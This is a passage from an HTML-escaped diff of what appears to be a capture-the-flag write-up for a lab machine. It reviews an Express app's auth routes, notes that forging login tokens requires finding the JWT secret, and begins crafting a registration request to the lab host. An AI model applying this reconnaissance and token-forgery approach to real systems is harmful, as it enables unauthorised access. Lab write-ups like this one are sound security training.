+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;authRoute&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./routes/auth&amp;#39;&lt;/span&gt;);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webroute&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./src/routes/web&amp;#39;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;dotenv&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;config&lt;/span&gt;();
+&lt;span style=&#34;color:#75715e&#34;&gt;//connect db 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;mongoose&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;connect&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;process&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;env&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;DB_CONNECT&lt;/span&gt;, { &lt;span style=&#34;color:#a6e22e&#34;&gt;useNewUrlParser&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt; }, () =&amp;gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;connect to db!&amp;#34;&lt;/span&gt;)
+);
+
+&lt;span style=&#34;color:#75715e&#34;&gt;//middle ware 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;());
+&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/api/user&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;authRoute&lt;/span&gt;)
+&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/api/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;privRoute&lt;/span&gt;)
+&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;webroute&lt;/span&gt;)
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;listen&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;3000&lt;/span&gt;, () =&amp;gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;server up and running&amp;#34;&lt;/span&gt;));
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Thanks to it, we can tell that &lt;code&gt;/api/user&lt;/code&gt; is using &lt;code&gt;auth.js&lt;/code&gt; and &lt;code&gt;/api/&lt;/code&gt; is using &lt;code&gt;private.js&lt;/code&gt; by looking at its imports, respectively.&lt;/p&gt;
+&lt;p&gt;Inspecting &lt;code&gt;auth.js&lt;/code&gt; divulges another valuable POST endpoint - &lt;code&gt;/api/user/register&lt;/code&gt; as well as its validating condition which consists of &lt;code&gt;name&lt;/code&gt;, &lt;code&gt;email&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt;. Moreover, JWT (JSON Web Token) is also being used as a login authorization method; hence, we have to find a secret key which is being retrieved from &lt;code&gt;process.env.TOKEN_SECRET&lt;/code&gt; or the &lt;code&gt;.env&lt;/code&gt; file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;router&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;express&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Router&lt;/span&gt;();
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;../model/user&amp;#39;&lt;/span&gt;);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bcrypt&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bcryptjs&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jwt&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;jsonwebtoken&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;registerValidation&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;loginValidation&lt;/span&gt;} &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;../validations&amp;#39;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;router&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;post&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/register&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) =&amp;gt; {
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// validation
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt; } &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;registerValidation&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;details&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;);
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// check if user exists
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;emailExist&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;findOne&lt;/span&gt;({&lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;})
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;emailExist&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Email already Exist&amp;#39;&lt;/span&gt;)
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// check if user name exist 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unameexist&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;findOne&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; })
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;unameexist&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Name already Exist&amp;#39;&lt;/span&gt;)
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;//hash the password
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;salt&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bcrypt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;genSalt&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;hashPaswrod&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bcrypt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;hash&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;salt&lt;/span&gt;)
+
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;//create a user 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;({
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;,
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;,
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;hashPaswrod&lt;/span&gt;
+    });
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;{
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;saveduser&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;save&lt;/span&gt;();
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;})
+    
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;){
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
+    }
+
+});
+
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// login 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;router&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;post&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/login&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt;  (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt; , &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) =&amp;gt; {
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt; } &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;loginValidation&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;details&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;);
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// check if email is okay 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;findOne&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt; })
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Email is wrong&amp;#39;&lt;/span&gt;);
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// check password 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;validPass&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bcrypt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;compare&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;validPass&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Password is wrong&amp;#39;&lt;/span&gt;);
+
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// create jwt 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jwt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sign&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;_id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; , &lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;}, &lt;span style=&#34;color:#a6e22e&#34;&gt;process&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;env&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TOKEN_SECRET&lt;/span&gt; )
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;auth-token&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;);
+
+})
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;router&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;) {
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;({
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; {
+
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404 page not found&amp;#34;&lt;/span&gt;,
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;desc&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;page you are looking for is not found. &amp;#34;&lt;/span&gt;
+        }
+    })
+});
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;module&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;exports&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;router&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Henceforth, we do know how to register a new user, so let us try sending a POST request to &lt;code&gt;/api/user/register&lt;/code&gt; and see whether it is a valid API or not.&lt;/p&gt;
+&lt;p&gt;You can try either Burpsuite or cURL should work properly and return the same response.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /api/user/register &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.11.120&lt;/span&gt;
+User-Agent&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&lt;/span&gt;
+Accept&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
+Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;en-US,en;q=0.5&lt;/span&gt;
+Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
+Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;close&lt;/span&gt;
+Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;application/json&lt;/span&gt;
+Upgrade-Insecure-Requests&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+If-None-Match&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;W/&amp;#34;5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s&amp;#34;&lt;/span&gt;
+Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;
+
